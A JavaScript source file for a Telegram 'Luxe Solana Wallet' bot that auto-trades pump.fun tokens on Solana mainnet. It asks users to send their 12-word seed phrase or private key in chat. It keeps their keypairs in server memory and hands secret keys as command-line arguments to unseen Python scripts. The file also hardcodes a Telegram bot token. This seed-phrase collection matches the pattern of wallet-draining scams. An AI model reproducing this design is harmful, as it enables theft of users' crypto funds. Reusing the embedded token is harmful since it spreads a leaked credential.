/**
 * ==============================================================================
 * ðŸ‘‘ LUXE SOLANA WALLET BOT â€” PREMIUM PRODUCTION MANIFEST (v6.0.0)
 * ==============================================================================
 */

import TelegramBot from "node-telegram-bot-api";
import fs from "fs";
import bs58 from "bs58";
import { spawn } from "child_process";
import { Connection, clusterApiUrl, Keypair, PublicKey } from "@solana/web3.js";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";

// ------------------------------------------------------------------------------
// âš™ï¸ SYSTEM CONFIGURATION & CONSTANTS
// ------------------------------------------------------------------------------
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || "8407148715:AAGBkS0IXSjO3HgF6vNYW-5YCcTcka5LcF0";
const NETWORK = "mainnet-beta";
const RPC_URL = clusterApiUrl(NETWORK);
const LOG_FILE = "output.txt";
const AWAIT_SAMPLE_TIMEOUT_MS = 3 * 60 * 1000;
const SOL_TO_USD_RATE = 133.93; 
const REFRESH_INTERVAL_MS = 1000; 

const PUMP_FUN_PROGRAM_ID = "6EF8rSdWkbzzqJuS2B73rw9URnR445as6U3LTmpxTazz";
const SLIPPAGE_BPS = 500; 
const JITO_TIP_LAMPORTS = 100000;

// ------------------------------------------------------------------------------
// ðŸ’¾ GLOBAL MEMORY & STATE MANAGEMENT
// ------------------------------------------------------------------------------
const userState = {};
const userPythonProcess = {};            
const userTrades = {};            
const userTargetHits = {};      
const liveMonitorIntervals = {}; 
const systemAuditLogs = [];

// NEW: Global Queue for active investment accounts
let activeInvestQueue = []; 

// HELPER: Simple sleep function for the delay
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ------------------------------------------------------------------------------
// ðŸš€ MASTER SCANNER (UPDATED WITH AUTO-BUY & AUTO-SELL QUEUE)
// ------------------------------------------------------------------------------
const globalScanner = spawn("python3", ["-u", "bot.py", "MASTER", "2.0", "0.001"]);

globalScanner.stdout.on("data", async (data) => {
    const output = data.toString();
    console.log(`[MASTER SCANNER]: ${output.trim()}`);

    // --- AUTOMATED BUY LOGIC (FIXED PARAMETER ORDER) ---
    const buyMatches = [...output.matchAll(/BUYING\s+([A-Za-z0-9]{32,44})/g)];
    for (const match of buyMatches) {
        const tokenAddr = match[1].trim();

        for (let i = 0; i < activeInvestQueue.length; i++) {
            const chatId = activeInvestQueue[i];
            const state = userState[chatId];

            if (state?.keypair) {
                const pk = bs58.encode(Array.from(state.keypair.secretKey));
                const amt = String(state.buyAmount || 0.001);
                const target = String(state.targetMultiplier || 2.0);

                // FIX A: Correct Parameter Order [PK, Token, Amount, Target]
                spawn("python3", ["execute_buy.py", pk, tokenAddr, amt, target]);

                if (!userTrades[chatId]) userTrades[chatId] = [];
                userTrades[chatId].push({ 
                    address: tokenAddr, 
                    amount: amt, 
                    target: target, 
                    stamp: new Date().toLocaleTimeString() 
                });

                bot.sendMessage(chatId, `ðŸš€ *MASTER BOT ENTRY*\nDetected: \`${tokenAddr}\`\nExecuting buy for your account...`, { parse_mode: "Markdown" }).catch(()=>{});

                if (i < activeInvestQueue.length - 1) {
                    await sleep(2000);
                }
            }
        }
    }

    // --- AUTOMATED SELL LOGIC (TP/STOPLOSS/CRASH) ---
    const sellMatches = [...output.matchAll(/CRITICAL_SELL\s+([A-Za-z0-9]{32,44})/g)];
    for (const match of sellMatches) {
        const tokenAddr = match[1].trim();

        for (let i = 0; i < activeInvestQueue.length; i++) {
            const chatId = activeInvestQueue[i];
            const state = userState[chatId];

            if (state?.keypair) {
                const pk = bs58.encode(Array.from(state.keypair.secretKey));

                // Trigger Python sell script
                spawn("python3", ["execute_sell.py", pk, tokenAddr]);

                // Clear from active trades list
                if (userTrades[chatId]) {
                    userTrades[chatId] = userTrades[chatId].filter(t => t.address !== tokenAddr);
                }

                bot.sendMessage(chatId, `ðŸš¨ *MASTER BOT EXIT*\nToken: \`${tokenAddr}\`\nMarket condition met. Executing sell for your account...`, { parse_mode: "Markdown" }).catch(()=>{});

                if (i < activeInvestQueue.length - 1) {
                    await sleep(1500); // Slightly faster delay for sells
                }
            }
        }
    }
});

globalScanner.stderr.on("data", (data) => {
    console.error(`[SCANNER CRITICAL ERROR]: ${data}`);
});

globalScanner.on("close", (code) => {
    console.log(`Master Scanner process exited with code ${code}`);
});

// ------------------------------------------------------------------------------
// ðŸ”— BLOCKCHAIN INFRASTRUCTURE
// ------------------------------------------------------------------------------
const connection = new Connection(RPC_URL, {
    commitment: "confirmed",
    confirmTransactionInitialTimeout: 60000,
    wsEndpoint: RPC_URL.replace("https", "wss")
});

// ------------------------------------------------------------------------------
// ðŸ¤– TELEGRAM BOT INITIALIZATION
// ------------------------------------------------------------------------------
const bot = new TelegramBot(BOT_TOKEN, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            allowed_updates: ["message", "callback_query"]
        }
    } 
});

// ------------------------------------------------------------------------------
// ðŸ”Œ EXTERNAL MODULE INTEGRATION
// ------------------------------------------------------------------------------
import { attachExtraButtons, getExtraButtons } from "./extra_buttons.js";
attachExtraButtons(bot, userState);

// ------------------------------------------------------------------------------
// ðŸ› ï¸ INTERNAL UTILITY SUITE
// ------------------------------------------------------------------------------

function logToFile(line) {
    try { 
        const timestamp = new Date().toISOString();
        const entry = `[${timestamp}] ${line}`;
        fs.appendFileSync(LOG_FILE, entry + "\n", "utf8"); 
        systemAuditLogs.push(entry);
        if (systemAuditLogs.length > 100) systemAuditLogs.shift();
    } catch (e) {
        console.error("Logging failed:", e.message);
    }
}

async function deleteMessageSafe(chatId, messageId) {
    if (!messageId) return; 
    try { 
        await bot.deleteMessage(chatId, messageId); 
    } catch (e) {}
}

async function updateStatusMessage(chatId, text, autoDeleteMs = null) {
    const state = userState[chatId];
    if (state.lastStatusMsgId) {
        await deleteMessageSafe(chatId, state.lastStatusMsgId);
    }
    try {
        const sent = await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
        state.lastStatusMsgId = sent.message_id;
        if (autoDeleteMs) {
            setTimeout(() => deleteMessageSafe(chatId, sent.message_id), autoDeleteMs);
        }
    } catch (e) {
        logToFile(`Status Message Error: ${e.message}`);
    }
}

function solFromLamports(lamports) { return Number((lamports / 1e9).toFixed(6)); }
function solDisplay(solNum) { return solNum.toFixed(6); }
function usdDisplay(solNum) { return (solNum * SOL_TO_USD_RATE).toFixed(2); }
function shortAddress(addr) { return addr?.length > 12 ? addr.slice(0, 6) + "â€¦" + addr.slice(-6) : addr; }
function getTimestamp() { return new Date().toLocaleTimeString(); }

// ------------------------------------------------------------------------------
// ðŸ“¡ REAL-TIME BALANCE MONITOR (1-SECOND TICK)
// ------------------------------------------------------------------------------

async function runLiveMonitor(chatId) {
    if (liveMonitorIntervals[chatId]) clearInterval(liveMonitorIntervals[chatId]);

    liveMonitorIntervals[chatId] = setInterval(async () => {
        const state = userState[chatId];
        if (!state || !state.connected || !state.walletAddress || !state.lastMenuMsgId) {
            clearInterval(liveMonitorIntervals[chatId]);
            return;
        }

        try {
            const pubKey = new PublicKey(state.walletAddress);
            const balanceLamports = await connection.getBalance(pubKey);
            const solNum = solFromLamports(balanceLamports);
            const combined = `${solDisplay(solNum)} SOL | $${usdDisplay(solNum)}`;

            if (state.lastBalanceText !== combined) {
                state.lastBalanceText = combined;
                const body = `ðŸ‘‘ *LUXE SOLANA WALLET* ðŸ‘‘\n\n` +
                             `ðŸŸ© *Connected* â€” \`${state.walletAddress}\`\n\n` +
                             `ðŸ’› *Live Balance:* ${combined}\n` +
                             `ðŸ•’ _Updated: ${getTimestamp()}_`;

                await bot.editMessageText(body, {
                    chat_id: chatId,
                    message_id: state.lastMenuMsgId,
                    parse_mode: "Markdown",
                    reply_markup: premiumMenu({ 
                        connected: true, 
                        balanceText: combined, 
                        chatId, 
                        extraButtons: getExtraButtons() 
                    })
                }).catch(() => {});
            }
        } catch (error) {
            logToFile(`Monitor Error for ${chatId}: ${error.message}`);
        }
    }, REFRESH_INTERVAL_MS);
}

// ------------------------------------------------------------------------------
// ðŸŽ¨ DYNAMIC UI ENGINE
// ------------------------------------------------------------------------------

function premiumMenu({ connected = false, balanceText = null, chatId = null, extraButtons = [] } = {}) {
    const PAD_WIDTH = 48;
    const state = userState[chatId] || {};
    const isUserInQueue = activeInvestQueue.includes(chatId);

    const connectLabel = (connected ? "ðŸŸ©    CONNECTED (WALLET ACTIVE)    " : "ðŸ”    CONNECT YOUR WALLET    ").padEnd(PAD_WIDTH, " ");
    const balanceLabel = (balanceText ? `ðŸ’›    BALANCE â€” ${balanceText}    ` : "ðŸ’›    BALANCE    ").padEnd(PAD_WIDTH, " ");
    const investLabel = (isUserInQueue ? "ðŸŸ¥    STOP INVESTMENT BOT    " : "âšœï¸    START INVESTMENT BOT    ").padEnd(PAD_WIDTH, " ");
    const tradesLabel = "ðŸ“Š    TRADES    ".padEnd(PAD_WIDTH, " ");
    const sellLabel = "ðŸ’¸    SELL BACK    ".padEnd(PAD_WIDTH, " ");

    const lastHit = userTargetHits[chatId]?.length > 0 ? userTargetHits[chatId][userTargetHits[chatId].length - 1].address : null;
    const targetHitLabel = (lastHit ? `ðŸŽ¯    HIT: ${shortAddress(lastHit)}` : "ðŸŽ¯    TARGET HIT    ").padEnd(PAD_WIDTH, " ");
    const targetMultiplierLabel = (state.targetMultiplier ? `ðŸŽ¯    TARGET SET TO ${state.targetMultiplier}x    ` : "ðŸŽ¯    SET TARGET    ").padEnd(PAD_WIDTH, " ");
    const buyAmountLabel = (state.buyAmount ? `ðŸ’°    AMOUNT SET TO ${state.buyAmount} SOL    ` : "ðŸ’°    SET AMOUNT    ").padEnd(PAD_WIDTH, " ");

    const keyboard = [
        [{ text: connectLabel, callback_data: "connect_wallet" }],
        [{ text: balanceLabel, callback_data: "balance" }],
        [{ text: investLabel, callback_data: "invest" }],
        [{ text: tradesLabel, callback_data: "trades" }],
        [{ text: sellLabel, callback_data: "sell_back_list" }],
        [{ text: "ðŸ›‘    PANIC SELL ALL    ".padEnd(PAD_WIDTH, " "), callback_data: "panic_sell" }], 
        [{ text: targetHitLabel, callback_data: "target_hit" }],
        [{ text: targetMultiplierLabel, callback_data: "set_target" }],
        [{ text: buyAmountLabel, callback_data: "set_amount" }],
        [{ text: "ðŸ›¡ï¸ VERIFY DEV RUG HISTORY", callback_data: "verify_rug_history" }],
        [{ text: "âš¡ PUMP.FUN MODE: ACTIVE", callback_data: "pump_fun_info" }]
    ];

    if (extraButtons?.length) keyboard.push(...extraButtons);
    if (connected) keyboard.push([{ text: "âŒ    DISCONNECT WALLET    ".padEnd(PAD_WIDTH, " "), callback_data: "disconnect" }]);

    return { inline_keyboard: keyboard };
}

// ------------------------------------------------------------------------------
// ðŸ–¼ï¸ UI RENDERER
// ------------------------------------------------------------------------------

async function showMenu(chatId, text, keyboard) {
    if (!userState[chatId]) userState[chatId] = { connected: false, buyAmount: 0.001, targetMultiplier: 2.0 };
    const state = userState[chatId];

    if (state.lastStatusMsgId) await deleteMessageSafe(chatId, state.lastStatusMsgId);
    if (state.lastMenuMsgId) await deleteMessageSafe(chatId, state.lastMenuMsgId);

    const buttons = keyboard || premiumMenu({ 
        connected: state.connected, 
        balanceText: state.lastBalanceText, 
        chatId, 
        extraButtons: getExtraButtons() 
    });

    try {
        const sent = await bot.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: buttons });
        state.lastMenuMsgId = sent.message_id;
    } catch (e) { logToFile(`Menu Render Error: ${e.message}`); }

    if (state.connected) runLiveMonitor(chatId);
}

// ------------------------------------------------------------------------------
// ðŸŽ® CALLBACK QUERY HANDLER
// ------------------------------------------------------------------------------

bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;
    const state = userState[chatId];

    // --- SELL BACK LIST ---
    if (data === "sell_back_list") {
        const trades = userTrades[chatId] || [];
        if (trades.length === 0) {
            const m = await bot.sendMessage(chatId, "âŒ No tokens to sell.");
            setTimeout(() => deleteMessageSafe(chatId, m.message_id), 5000);
            return;
        }
        let sellText = "ðŸ’¸ *SELECT TOKEN TO SELL*";
        const btns = trades.map((t, i) => [{ text: `SELL ${shortAddress(t.address)} (${t.amount} SOL)`, callback_data: `exec_sell_${i}` }]);
        btns.push([{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]);
        await bot.editMessageText(sellText, { chat_id: chatId, message_id: messageId, parse_mode: "Markdown", reply_markup: { inline_keyboard: btns } });
        return;
    }

    // --- EXECUTE SELL ---
    if (data.startsWith("exec_sell_")) {
        const idx = data.split("_")[2];
        const trade = userTrades[chatId][idx];
        const secret = bs58.encode(Array.from(state.keypair.secretKey));

        await deleteMessageSafe(chatId, messageId);
        await updateStatusMessage(chatId, `ðŸš€ *EXECUTING SELL BACK...*`);

        const signatures = [];
        const proc = spawn("python3", ["execute_sell.py", secret, trade.address]);

        proc.stdout.on("data", (d) => { 
            const output = d.toString();
            const sigMatch = output.match(/(?:Signature|TX|Hash):\s*([A-Za-z0-9]{32,88})/i);
            if (sigMatch) signatures.push(sigMatch[1]);
        });

        proc.on("close", async () => {
            userTrades[chatId].splice(idx, 1);
            let report = "âœ… *SELL COMPLETE*";
            if (signatures.length > 0) report += `\n\nðŸ”— [View Transaction](https://solscan.io/tx/${signatures[0]})`;
            const resMsg = await bot.sendMessage(chatId, report, { parse_mode: "Markdown", disable_web_page_preview: true });
            setTimeout(() => deleteMessageSafe(chatId, resMsg.message_id), 10000);
            showMenu(chatId, "ðŸ‘‘ *LUXE SOLANA WALLET* ðŸ‘‘");
        });
        return;
    }

    // --- PANIC SELL ---
    if (data === "panic_sell") {
        const trades = userTrades[chatId] || [];
        if (trades.length === 0) {
            const noneMsg = await bot.sendMessage(chatId, "âŒ No active trades found.");
            setTimeout(() => deleteMessageSafe(chatId, noneMsg.message_id), 5000);
            return showMenu(chatId, "ðŸ‘‘ *LUXE SOLANA WALLET* ðŸ‘‘");
        }
        await updateStatusMessage(chatId, `ðŸš¨ *PANIC SELL INITIATED* ðŸš¨\nSelling ${trades.length} tokens...`);
        const pk = bs58.encode(Array.from(state.keypair.secretKey));
        const signatures = [];
        let completed = 0;
        for (let i = 0; i < trades.length; i++) {
            const tokenAddr = trades[i].address;
            if (i > 0) await new Promise(r => setTimeout(r, 1000)); 
            const proc = spawn("python3", ["execute_sell.py", pk, tokenAddr]);
            proc.stdout.on("data", (d) => {
                const sigMatch = d.toString().match(/(?:Signature|TX|Hash):\s*([A-Za-z0-9]{32,88})/i);
                if (sigMatch) signatures.push({ addr: tokenAddr, sig: sigMatch[1] });
            });
            proc.on("close", async () => {
                completed++;
                if (completed === trades.length) {
                    let report = "âœ… *PANIC SELL COMPLETE*\n\n";
                    signatures.forEach(s => report += `ðŸ”¹ \`${s.addr.slice(0, 6)}...\` -> [View TX](https://solscan.io/tx/${s.sig})\n`);
                    const resMsg = await bot.sendMessage(chatId, report, { parse_mode: "Markdown", disable_web_page_preview: true });
                    setTimeout(() => deleteMessageSafe(chatId, resMsg.message_id), 15000);
                    userTrades[chatId] = [];
                    return showMenu(chatId, "ðŸ‘‘ *LUXE SOLANA WALLET* ðŸ‘‘");
                }
            });
        }
        return;
    }

    if (data.startsWith("del_trade_")) {
        const idx = parseInt(data.split("_")[2]);
        userTrades[chatId].splice(idx, 1);
        return showTradesList(chatId);
    }

    await deleteMessageSafe(chatId, messageId);

    if (data === "verify_rug_history") {
        state.awaitingRugToken = true;
        const sent = await bot.sendMessage(chatId, "ðŸ›¡ï¸ *Paste the Token Address or Dev Wallet to check rug history:*", { 
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: [[{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]] }
        });
        state.lastPromptId = sent.message_id;
        return;
    }

    if (data === "pump_fun_info") {
        const info = "âš¡ *PUMP.FUN MODE*\n\nOptimized for bonding curve detection.\nâ€¢ Program: \`6EF8rSdW...\`\nâ€¢ Slippage: 500 BPS";
        const infoMsg = await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
        setTimeout(() => deleteMessageSafe(chatId, infoMsg.message_id), 15000);
        return showMenu(chatId, "ðŸ‘‘ *LUXE SOLANA WALLET* ðŸ‘‘");
    }

    if (data === "connect_wallet") {
        const keyboard = { inline_keyboard: [
            [{ text: "âœï¸ ENTER SAMPLE CODE", callback_data: "enter_sample" }],
            [{ text: "ðŸ” ENTER 12-WORD PHRASE", callback_data: "enter_mnemonic" }],
            [{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]
        ]};
        await showMenu(chatId, "ðŸ‘‘ *CONNECT WALLET* ðŸ‘‘", keyboard);
        return;
    }

    if (data === "enter_mnemonic") {
        state.awaitingMnemonic = true;
        const sent = await bot.sendMessage(chatId, "ðŸ” *Send your 12-word Trust Wallet phrase now.*", { parse_mode: "Markdown" });
        state.lastPromptId = sent.message_id;
        return;
    }

    if (data === "enter_sample") {
        state.awaitingSampleCode = true;
        const sent = await bot.sendMessage(chatId, "âœï¸ *Send your Sample Wallet Code now.*", { parse_mode: "Markdown" });
        state.lastPromptId = sent.message_id;
        return;
    }

    if (data === "set_target") {
        state.awaitingTarget = true;
        const sent = await bot.sendMessage(chatId, "ðŸŽ¯ *Send your target multiplier now (e.g., 2):*", { parse_mode: "Markdown" });
        state.lastPromptId = sent.message_id;
        return;
    }

    if (data === "set_amount") {
        state.awaitingAmount = true;
        const sent = await bot.sendMessage(chatId, "ðŸ’° *Send your buy amount in SOL (e.g., 0.002):*", { parse_mode: "Markdown" });
        state.lastPromptId = sent.message_id;
        return;
    }

    if (data === "invest") {
        if (!state.connected || !state.keypair) return updateStatusMessage(chatId, "âŒ Connect wallet first.", 5000);
        if (!activeInvestQueue.includes(chatId)) {
            activeInvestQueue.push(chatId);
            await updateStatusMessage(chatId, "â–¶ï¸ *MASTER BOT LINKED.*", 5000);
        } else {
            activeInvestQueue = activeInvestQueue.filter(id => id !== chatId);
            await updateStatusMessage(chatId, "â›” *BOT UNLINKED.*", 5000);
        }
        await showMenu(chatId, "âšœï¸ Investment Panel");
        return;
    }

    if (data === "trades") return showTradesList(chatId);
    if (data === "target_hit") return showHitsList(chatId);
    if (data === "back_home") return showMenu(chatId, "ðŸ‘‘ *LUXE SOLANA WALLET* ðŸ‘‘");

    if (data === "disconnect") {
        state.connected = false;
        activeInvestQueue = activeInvestQueue.filter(id => id !== chatId);
        if (liveMonitorIntervals[chatId]) clearInterval(liveMonitorIntervals[chatId]);
        await showMenu(chatId, "ðŸ‘‘ *WALLET DISCONNECTED*");
        return;
    }
});

// ------------------------------------------------------------------------------
// ðŸ“‰ LIST VIEWS
// ------------------------------------------------------------------------------

async function showTradesList(chatId) {
    const trades = userTrades[chatId] || [];
    if (trades.length === 0) {
        const m = await bot.sendMessage(chatId, "ðŸ“Š No active trades.", { reply_markup: { inline_keyboard: [[{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]] } });
        setTimeout(() => deleteMessageSafe(chatId, m.message_id), 5000);
        return;
    }
    let text = "ðŸ“Š *ACTIVE TRADES*\n\n";
    const btns = trades.map((t, i) => {
        text += `ðŸ”¹ *Trade #${i + 1}*\nToken: \`${t.address}\`\nAmount: ${t.amount} SOL\n\n`;
        return [{ text: `ðŸ—‘ï¸ Delete Trade #${i + 1}`, callback_data: `del_trade_${i}` }];
    });
    btns.push([{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]);
    await bot.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: btns } });
}

async function showHitsList(chatId) {
    const hits = userTargetHits[chatId] || [];
    if (hits.length === 0) {
        const m = await bot.sendMessage(chatId, "ðŸŽ¯ No targets hit.", { reply_markup: { inline_keyboard: [[{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]] } });
        setTimeout(() => deleteMessageSafe(chatId, m.message_id), 5000);
        return;
    }
    let text = "ðŸŽ¯ *TARGET HIT HISTORY*\n\n";
    hits.forEach((h, i) => text += `âœ… *SUCCESS #${i+1}*\nAddress: \`${h.address}\`\nMultiplier: ${h.target}x\n\n`);
    await bot.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]] } });
}

// ------------------------------------------------------------------------------
// âœ‰ï¸ MESSAGE INPUT PROCESSOR
// ------------------------------------------------------------------------------

bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    if (!userState[chatId]) userState[chatId] = { connected: false, buyAmount: 0.001, targetMultiplier: 2.0 };
    const state = userState[chatId];
    const text = (msg.text || "").trim();

    if (text === "/start") {
        return showMenu(chatId, "ðŸ‘‘ *LUXE SOLANA WALLET v6.0* ðŸ‘‘\n\nMaster Scanner: Active\nStatus: Online");
    }

    if (text.startsWith("/")) return;

    await deleteMessageSafe(chatId, msg.message_id);
    if (state.lastPromptId) await deleteMessageSafe(chatId, state.lastPromptId);

    if (state.awaitingMnemonic) {
        state.awaitingMnemonic = false;
        await updateStatusMessage(chatId, "â³ *Syncing...*");
        const pySync = spawn("python3", ["wallet_sync.py", text]);
        let pyOutput = "";
        pySync.stdout.on("data", (d) => pyOutput += d.toString());
        pySync.on("close", async () => {
            const lines = pyOutput.split("\n");
            const addr = lines.find(l => l.includes("ADDRESS:"))?.split(":")[1].trim();
            const secret = lines.find(l => l.includes("SECRET:"))?.split(":")[1].trim();
            if (addr && secret) {
                state.connected = true;
                state.walletAddress = addr;
                state.keypair = Keypair.fromSecretKey(Uint8Array.from(bs58.decode(secret)));
                await showMenu(chatId, `âœ… *WALLET SYNCED*\n\n\`${addr}\``);
            } else { await updateStatusMessage(chatId, "âŒ *Sync Failed.*", 5000); }
        });
        return;
    }

    if (state.awaitingSampleCode) {
        state.awaitingSampleCode = false;
        try {
            state.keypair = Keypair.fromSecretKey(Uint8Array.from(bs58.decode(text)));
            state.connected = true;
            state.walletAddress = state.keypair.publicKey.toBase58();
            await showMenu(chatId, `âœ… *CONNECTED*\n\n\`${state.walletAddress}\``);
        } catch (e) { await updateStatusMessage(chatId, `âŒ Invalid key.`, 5000); }
        return;
    }

    if (state.awaitingTarget) {
        const val = parseFloat(text);
        if (!isNaN(val)) state.targetMultiplier = val;
        state.awaitingTarget = false;
        await showMenu(chatId, "âšœï¸ Investment Panel");
        return;
    }

    if (state.awaitingAmount) {
        const val = parseFloat(text);
        if (!isNaN(val)) state.buyAmount = val;
        state.awaitingAmount = false;
        await showMenu(chatId, "âšœï¸ Investment Panel");
        return;
    }

    if (state.awaitingRugToken) {
        state.awaitingRugToken = false;
        await updateStatusMessage(chatId, "ðŸ”Ž *Scanning Dev History...*");
        const pyProc = spawn("python3", ["main.py", text]);
        let output = "";
        pyProc.stdout.on("data", (d) => output += d.toString());
        pyProc.on("close", async () => {
            const rugMsg = await bot.sendMessage(chatId, `ðŸ“Š *Rug History:*\n\`${output || "No history found."}\``, { 
                parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "â¬…ï¸ BACK", callback_data: "back_home" }]] }
            });
            setTimeout(() => deleteMessageSafe(chatId, rugMsg.message_id), 30000);
        });
        return;
    }
    await showMenu(chatId, "ðŸ‘‘ *LUXE SOLANA WALLET* ðŸ‘‘");
});

bot.on("polling_error", (err) => logToFile("Polling Error: " + err.message));
console.log("ðŸ’Ž LUXE SOLANA BOT V6.0 STARTED â€” GLOBAL MASTER SCANNER ACTIVE (2s DELAY)");